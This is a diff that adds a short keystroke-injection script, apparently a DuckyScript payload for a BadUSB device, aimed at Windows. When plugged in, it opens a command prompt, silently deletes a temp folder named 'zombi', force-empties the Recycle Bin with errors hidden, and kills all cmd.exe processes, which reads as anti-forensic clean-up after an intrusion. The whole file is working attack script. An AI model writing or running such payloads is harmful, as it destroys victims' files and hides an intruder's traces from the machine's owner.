@@ -1,0 +1,21 @@
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 600
+STRING IF EXIST "C:\Users\%USERNAME%\AppData\Local\Temp\zombi" (rmdir /s /q "C:\Users\%USERNAME%\AppData\Local\Temp\zombi")
+ENTER
+DELAY 600
+STRING exit
+ENTER
+DELAY 600
+GUI r
+DELAY 300
+STRING cmd
+ENTER
+DELAY 600
+STRING powershell -Command "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"
+ENTER
+DELAY 600
+STRING taskkill /IM cmd.exe /F
+ENTER
